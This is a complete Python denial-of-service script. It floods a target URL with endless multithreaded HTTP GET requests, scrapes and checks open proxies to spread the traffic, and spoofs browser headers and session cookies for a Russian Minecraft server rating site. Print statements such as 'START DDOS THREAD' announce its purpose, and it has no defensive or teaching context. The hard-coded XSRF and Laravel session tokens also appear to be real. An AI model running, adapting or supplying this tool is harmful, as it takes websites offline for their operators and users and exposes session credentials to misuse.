import sys
import threading
import time

import requests
from threading import Thread

import os.path

cookies = {
    '_ym_uid': '1670444594732756055',
    '_ym_d': '1670444594',
    '_ym_isad': '2',
    'XSRF-TOKEN': 'eyJpdiI6IjQ2eGtKODFCMTRUUkNlYlcxUE1HeUE9PSIsInZhbHVlIjoiOEYwc1B4VUp5RE0xalE3WVhHMzJaWWkvRTJHSWZWSjRmN1BteXFOUVQvZGVQRDI2RHZCK0UyTEJkelg1b3Z0Q3czSDJzSkdXL3N2b3RSWHcwNDlrU2I5c1lhaHlCYmZVWFBJOTNNanU1bmYyUUluNHo3dnNncTdPTDR3bWhQR3YiLCJtYWMiOiIzYTU5MWJhMGQ2NjEwMWU5NDQzYTgyN2I5YmZhNzA5MDJiM2FlZTc2OWFhM2E4MTVlZWM2NzJlNWFhNzFlYTA4IiwidGFnIjoiIn0%3D',
    'laravel_session': 'cGVgdK6hmVDLxJfkyOEIZQKxd9Zxc45F9jtJB4Do',
}

headers = {
    'authority': 'minecraftrating.ru',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': '_ym_uid=1670444594732756055; _ym_d=1670444594; _ym_isad=2; XSRF-TOKEN=eyJpdiI6IjQ2eGtKODFCMTRUUkNlYlcxUE1HeUE9PSIsInZhbHVlIjoiOEYwc1B4VUp5RE0xalE3WVhHMzJaWWkvRTJHSWZWSjRmN1BteXFOUVQvZGVQRDI2RHZCK0UyTEJkelg1b3Z0Q3czSDJzSkdXL3N2b3RSWHcwNDlrU2I5c1lhaHlCYmZVWFBJOTNNanU1bmYyUUluNHo3dnNncTdPTDR3bWhQR3YiLCJtYWMiOiIzYTU5MWJhMGQ2NjEwMWU5NDQzYTgyN2I5YmZhNzA5MDJiM2FlZTc2OWFhM2E4MTVlZWM2NzJlNWFhNzFlYTA4IiwidGFnIjoiIn0%3D; laravel_session=cGVgdK6hmVDLxJfkyOEIZQKxd9Zxc45F9jtJB4Do',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}

global sort
sort = False


def send_req(url):
    while True:
        try:
            response = requests.get(url, headers=headers, cookies=cookies, timeout=10)
            print_code(status=response.status_code)
        except Exception:
            time.sleep(10)
        time.sleep(0.5)


def print_code(status):
    if status == 403:
        print("403_FORBIDEN_ACCESS")
    elif status == 200:
        print("200_RESPONSE_CODE")
    elif status == 502:
        print("502_BAD_GATEWAY")
    elif status == 404:
        print("404_NOT_FOUND")
    elif status == 429:
        print("429_TOO_MANY_REQUESTS")
    elif status == 400:
        print("400_BAD_REQUEST")
    elif status == 503:
        print("503_SERVICE_UNAVAILABLE")
    else:
        print(f"{status}_RESPONSE_CODE")


def send_req_proxy(url, proxy):
    if proxy is None:
        return

    proxylist = {
        "http": f"http://{proxy}",
        "https": f"http://{proxy}"
    }

    while True:
        try:
            response = requests.get(url, headers=headers, cookies=cookies, proxies=proxylist, timeout=10)

            if response.status_code == 403:
                print("403_FORBIDEN_ACCESS")
                return

            print_code(response.status_code)

        except Exception:
            time.sleep(2)
            continue
        time.sleep(0.5)


def valid(line):
    proxy = {
        "http": f"http://{line}",
        "https": f"http://{line}"
    }

    try:
        requests.get(sys.argv[1], headers=headers, proxies=proxy, timeout=5)
        response = requests.get(sys.argv[1], headers=headers, proxies=proxy, timeout=5)

        if response.status_code == 200:
            with open("valid.txt", "a") as f:
                print("VALID PROXY FOUND")
                f.write(line)

    except Exception:
        pass

# VALID PROXY FOUND, SEND REQUEST!

def flood(line):
    proxy = {
        "http": f"http://{line}",
        "https": f"http://{line}"
    }

    try:
        requests.get(sys.argv[1], headers=headers, proxies=proxy, timeout=5)
        response = requests.get(sys.argv[1], headers=headers, proxies=proxy, timeout=5)

        if response.status_code == 403:
            return

        print_code(response.status_code)

    except Exception:
        pass

def parsing():
    # get dict

    with open("urls.txt", "r") as f:
        for num, link in enumerate(f):
            response = requests.get(link.strip(), headers=headers, timeout=2)
            data = response.text.split("\n")
            with open("https.txt", "a") as proxfile:
                for line in data:
                    proxfile.write(line + "\n")
                print("success parsing proxy in " + str(num) + " url")


def main():
    if len(sys.argv) != 5:
        print("if you don`t use proxy set null in proxy")
        print("if you would like parse proxy set auto in proxy")
        print("METHODS: flood, request")
        print("usage: python main.py <url> <proxy> <requests> <method>")
        exit(0)

    if sys.argv[4] == "request":

        if sys.argv[2] == "auto":
            print("REMOVING OLD PROXY...")

            if os.path.exists("https.txt"):
                os.remove("https.txt")

            with open('https.txt', 'w') as f:
                f.write('')

            if os.path.exists("valid.txt"):
                os.remove("valid.txt")

            with open('valid.txt', 'w') as f:
                f.write('')

            print("START PARSING NEW PROXY..")
            parsing()
            print("START SORTING PROXY")

            threads = []

            with open("https.txt", "r") as f:
                for line in f:
                    th = threading.Thread(target=valid, args=(line,))
                    threads.append(th)
                    th.start()

            for t in threads:
                t.join()

        print("START DDOS THREAD")

        if sys.argv[2] == "null":
            for i in range(0, int(sys.argv[3])):
                Thread(target=send_req, args=(sys.argv[1],)).start()
        else:
            if sys.argv[2] == "auto":
                with open("valid.txt", "r") as f:
                    for line in f:
                        for i in range(0, int(sys.argv[3])):
                            try:
                                Thread(target=send_req_proxy, args=(sys.argv[1], line,)).start()
                            except Exception:
                                continue
            else:
                with open(sys.argv[2], "r") as f:
                    for line in f:
                        for i in range(0, int(sys.argv[3])):
                            try:
                                Thread(target=send_req_proxy, args=(sys.argv[1], line,)).start()
                            except Exception:
                                continue
# FLOOD METHOD
    elif sys.argv[4] == "flood":
        parsing()
        print("START DDOS FLOOD METHOD")

        threads = []

        while True:
            with open("https.txt", "r") as f:
                for line in f:
                    th = threading.Thread(target=flood, args=(line,))
                    threads.append(th)
                    th.start()
    else:
        print("Wrong method!")



if __name__ == "__main__":
    main()
